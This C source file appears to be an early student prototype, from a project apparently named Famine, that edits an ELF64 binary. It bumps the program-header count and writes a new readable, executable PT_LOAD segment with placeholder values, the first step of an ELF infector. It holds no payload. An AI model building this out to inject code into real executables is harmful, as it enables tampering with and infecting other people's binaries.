/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   main.c                                             :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: nguiard <nguiard@student.42.fr>            +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2024/09/09 03:01:26 by nguiard           #+#    #+#             */
/*   Updated: 2024/10/28 15:04:23 by nguiard          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "famine.h"

#define	E_PHNUM_OFFSET EI_NIDENT + 2 + 2 + 4 + 8 + 8 + 8 + 4 + 2 + 2

int main(int argc, char **argv) {
	FILE		*f;
	Elf64_Ehdr	elf_header;

	if (argc != 2)
		return 1;

	if (valid_file(&f, argv[1])) {
		printf("Invalid\n");
		return 1;
	} else {
		printf("valid\n");
	}

	fseek(f, 0, SEEK_SET);

	
	fread(&elf_header, sizeof(Elf64_Ehdr), 1, f);

	fseek(f, E_PHNUM_OFFSET, SEEK_SET);


	Elf64_Half new_number_segments = elf_header.e_phnum + 1;
	new_number_segments = 14; // test purposes

	fwrite(&new_number_segments, sizeof(Elf64_Half), 1, f); 
	fseek(f, elf_header.e_phoff + (elf_header.e_phentsize * (elf_header.e_phnum - 1)), SEEK_SET);

	Elf64_Phdr new_prog_header = {
		.p_type		= PT_LOAD,
		.p_flags	= PF_R + PF_X,
		.p_offset	= 0x42,
		.p_vaddr	= 0x420,
		.p_paddr	= 0x4200,
		.p_filesz	= 0x80,
		.p_memsz	= 0x80,
		.p_align	= 0x8,
	};

	fwrite(&new_prog_header, sizeof(Elf64_Phdr), 1, f);

	//print_elf(f);
}
